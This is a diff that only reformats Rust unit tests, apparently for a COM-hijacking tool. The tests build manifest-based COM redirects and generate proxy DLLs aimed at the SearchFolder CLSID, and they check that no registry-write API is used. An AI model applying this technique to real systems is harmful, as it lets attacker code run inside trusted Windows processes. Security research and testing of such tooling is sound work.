-            "{4991D34B-80A1-4291}", "proxy.dll", None,
-        ).is_err());
+            "{4991D34B-80A1-4291}",
+            "proxy.dll",
+            None,
+        )
+        .is_err());
 
         // Non-hex characters
         assert!(ManifestBuilder::build_com_redirect_manifest(
-            "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}", "proxy.dll", None,
-        ).is_err());
+            "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}",
+            "proxy.dll",
+            None,
+        )
+        .is_err());
 
         // Wrong group lengths
         assert!(ManifestBuilder::build_com_redirect_manifest(
-            "{4991D34B80-A142-9183-B633-28366B9097}", "proxy.dll", None,
-        ).is_err());
+            "{4991D34B80-A142-9183-B633-28366B9097}",
+            "proxy.dll",
+            None,
+        )
+        .is_err());
     }
 
     #[test]
     fn test_xml_escape() {
         assert_eq!(xml_escape("hello&world"), "hello&amp;world");
         assert_eq!(xml_escape("<tag>"), "&lt;tag&gt;");
-        assert_eq!(xml_escape("it's \"quoted\""), "it&apos;s &quot;quoted&quot;");
+        assert_eq!(
+            xml_escape("it's \"quoted\""),
+            "it&apos;s &quot;quoted&quot;"
+        );
     }
 
     #[test]
     fn test_to_wide_null() {
         let wide = to_wide_null("hello");
-        assert_eq!(wide, &[b'h' as u16, b'e' as u16, b'l' as u16, b'l' as u16, b'o' as u16, 0]);
+        assert_eq!(
+            wide,
+            &[
+                b'h' as u16,
+                b'e' as u16,
+                b'l' as u16,
+                b'l' as u16,
+                b'o' as u16,
+                0
+            ]
+        );
     }
 
     #[test]
@@ -1588,18 +1704,16 @@ mod tests {
 
     #[test]
     fn test_target_selector_by_clsid() {
-        let target = TargetSelector::get_target_by_clsid(
-            "{4991D34B-80A1-4291-83B6-3328366B9097}",
-        ).unwrap();
+        let target =
+            TargetSelector::get_target_by_clsid("{4991D34B-80A1-4291-83B6-3328366B9097}").unwrap();
         assert_eq!(target.prog_id, Some("SearchFolder".to_string()));
     }
 
     #[test]
     fn test_proxy_dll_generation() {
-        let dll = generate_proxy_dll_template(
-            "{4991D34B-80A1-4291-83B6-3328366B9097}",
-            "SearchFolder",
-        ).unwrap();
+        let dll =
+            generate_proxy_dll_template("{4991D34B-80A1-4291-83B6-3328366B9097}", "SearchFolder")
+                .unwrap();
 
         // Verify it's a valid PE
         assert!(dll.len() > 512);
@@ -1637,9 +1751,13 @@ mod tests {
             "{4991D34B-80A1-4291-83B6-3328366B9097}",
             "C:\\temp\\proxy.dll",
             Some("SearchFolder"),
-        ).unwrap();
+        )
+        .unwrap();
 
-        assert_eq!(result.target_clsid, "{4991D34B-80A1-4291-83B6-3328366B9097}");
+        assert_eq!(
+            result.target_clsid,
+            "{4991D34B-80A1-4291-83B6-3328366B9097}"
+        );
         assert_eq!(result.proxy_dll_path, "C:\\temp\\proxy.dll");
         assert!(result.manifest_xml.contains("comClass"));
     }
@@ -1654,14 +1772,15 @@ mod tests {
 
     #[test]
     fn test_generate_proxy_api() {
-        let result = generate_proxy(
-            "{4991D34B-80A1-4291-83B6-3328366B9097}",
-            "SearchFolder",
-        ).unwrap();
+        let result =
+            generate_proxy("{4991D34B-80A1-4291-83B6-3328366B9097}", "SearchFolder").unwrap();
 
         assert!(!result.dll_hex.is_empty());
         assert!(result.dll_size > 512);
-        assert_eq!(result.target_clsid, "{4991D34B-80A1-4291-83B6-3328366B9097}");
+        assert_eq!(
+            result.target_clsid,
+            "{4991D34B-80A1-4291-83B6-3328366B9097}"
+        );
 
         // Verify the hex decodes to a valid PE
         let bytes = hex::decode(&result.dll_hex).unwrap();
@@ -1673,8 +1792,17 @@ mod tests {
         // Verify the module source code does NOT contain registry write APIs
         // This is a compilation-time acceptance criterion.
         let source = include_str!("com_hijack.rs");
-        assert!(!source.contains("RegSetValue"), "com_hijack.rs must not call RegSetValue");
-        assert!(!source.contains("RegCreateKey"), "com_hijack.rs must not call RegCreateKey");
-        assert!(!source.contains("NtSetValueKey"), "com_hijack.rs must not call NtSetValueKey");
+        assert!(
+            !source.contains("RegSetValue"),
+            "com_hijack.rs must not call RegSetValue"
+        );
+        assert!(
+            !source.contains("RegCreateKey"),
+            "com_hijack.rs must not call RegCreateKey"
+        );
+        assert!(
+            !source.contains("NtSetValueKey"),
+            "com_hijack.rs must not call NtSetValueKey"
+        );
     }
 }
